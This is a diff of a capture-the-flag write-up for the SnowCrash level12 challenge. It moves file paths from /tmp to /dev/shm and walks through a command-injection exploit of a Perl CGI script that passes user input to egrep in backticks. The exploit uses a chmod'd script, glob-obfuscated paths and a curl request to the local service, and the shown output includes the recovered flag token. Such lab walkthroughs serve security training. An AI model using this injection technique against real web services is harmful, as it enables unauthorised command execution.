@@ -22,7 +22,7 @@ sub t {
   $xx = $_[0];
   $xx =~ tr/a-z/A-Z/;
   $xx =~ s/\s.*//;
-  @output = `egrep "^$xx" /tmp/xd 2>&1`;
+  @output = `egrep "^$xx" /dev/shm/xd 2>&1`;
   foreach $line (@output) {
       ($f, $s) = split(/:/, $line);
       if($s =~ $nn) {
@@ -48,39 +48,39 @@ Here's what that would look like in a navigator:<br/>
 
 In the program, the shellscript is evaluated in the $xx variable... which we can exploit!<br/>
 The regex will capitalize the $xx argument. <br/>
-So if we write ```x="getflag > /tmp/flag12"``` it will be changed to ```"GETFLAG > /tmp/FLAG12"```.<br/>
+So if we write ```x="getflag > /dev/shm/flag12"``` it will be changed to ```"GETFLAG > /DEV/SHM/FLAG12"```.<br/>
 Linux is case-sensitive, so it will fail to recognize a filepath in capital case. <br/>
 Hmm... let's try writing our script to a file instead. 
 ```
-level12@SnowCrash:~$ echo "getflag > /tmp/flag12" > /tmp/EXPLOIT
-level12@SnowCrash:~$ cat /tmp/EXPLOIT
-getflag > /tmp/flag12
+level12@SnowCrash:~$ echo "getflag > /dev/shm/flag12" > /dev/shm/EXPLOIT
+level12@SnowCrash:~$ cat /dev/shm/EXPLOIT
+getflag > /dev/shm/flag12
 ```
 Let's make sure we can run the script. 
 ```
-level12@SnowCrash:~$ cd /tmp
-level12@SnowCrash:/tmp$ `EXPLOIT`
+level12@SnowCrash:~$ cd /dev/shm
+level12@SnowCrash:/dev/shm$ `EXPLOIT`
 EXPLOIT: command not found
 
-level12@SnowCrash:/tmp$ `/tmp/EXPLOIT`
-bash: /tmp/EXPLOIT: Permission denied
+level12@SnowCrash:/dev/shm$ `/dev/shm/EXPLOIT`
+bash: /dev/shm/EXPLOIT: Permission denied
 ```
 Ok, looks like it's not executable. Let's change the permissions on the file. 
 ```
-level12@SnowCrash:/tmp$ chmod 755 EXPLOIT
-level12@SnowCrash:/tmp$ `/tmp/EXPLOIT`
-level12@SnowCrash:/tmp$ ls
+level12@SnowCrash:/dev/shm$ chmod 755 EXPLOIT
+level12@SnowCrash:/dev/shm$ `/dev/shm/EXPLOIT`
+level12@SnowCrash:/dev/shm$ ls
 EXPLOIT  flag12
-level12@SnowCrash:/tmp$ cat flag12
+level12@SnowCrash:/dev/shm$ cat flag12
 Check flag.Here is your token :
 Nope there is no token here for you sorry. Try again :)
 ```
 It works! Time to leverage the perl program to execute our script.<br/>
 Since we can't pass the filepath directly (it'll get capitalized by the perl program and be unrecognizable), we'll use globbing and replace the file path with asterisks.
 ```
-level12@SnowCrash:/tmp$ curl '127.0.0.1:4646?x="`/*/*/EXPLOIT`"'
+level12@SnowCrash:/dev/shm$ curl '127.0.0.1:4646?x="`/*/*/EXPLOIT`"'
 ..
-level12@SnowCrash:/tmp$ cat flag12
+level12@SnowCrash:/dev/shm$ cat flag12
 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
 ```
 Success!
